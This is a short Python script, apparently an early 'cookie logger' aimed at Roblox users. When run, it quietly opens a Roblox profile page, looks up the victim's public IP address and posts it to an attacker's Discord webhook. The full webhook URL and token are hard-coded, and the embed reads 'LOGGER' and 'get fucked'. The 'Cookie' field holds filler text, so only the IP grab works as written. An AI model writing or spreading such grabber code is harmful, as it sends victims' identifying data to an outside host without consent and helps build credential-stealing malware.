import requests
import datetime
import subprocess
from discord_webhook import DiscordWebhook, DiscordEmbed

def open_roblox():
    # Open Roblox website in the default web browser in the background
    subprocess.Popen(["start", "/min", "https://www.roblox.com/users/439198608/profile"], shell=True)

if __name__ == "__main__":
    open_roblox()




    response = requests.get("https://api.ipify.org?format=json")
    public_ip = response.json()["ip"]

    start_time = datetime.datetime.now()

    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1358371882105311304/C8C5m4yU6jCI1RRueluFYH1esFi67X9HKjCzJqc9JTXkSyNn1ZYGYc4oxTdeQULp6v5w", content="<@1135749292770992158>")
    embed = DiscordEmbed(title="LOGGER", color="ffffff")
    embed.set_author(name="K6yq Cookie Logger", url="https://roblox.com", icon_url="")
    embed.set_footer(text="get fucked")
    embed.set_timestamp()
    embed.add_embed_field(name="IP address", value=f"{public_ip}")
    embed.add_embed_field(name="Cookie", value="gjgdfhjdfgjgdfjdfgjdfgjdfgjdfgjdfgjjjdfgdfjjdfgjudfgjdfgjdfgjdfjfgdjjdfgjdfgjdfgjdfgjdfgdfgjdfgjfdgjjgdfjdfg")
    embed.add_embed_field(name="Roblox Profile", value="https://www.roblox.com/users/439198608/profile")
    embed.add_embed_field(name="Date", value=f"{start_time}")

    webhook.add_embed(embed)
    response = webhook.execute()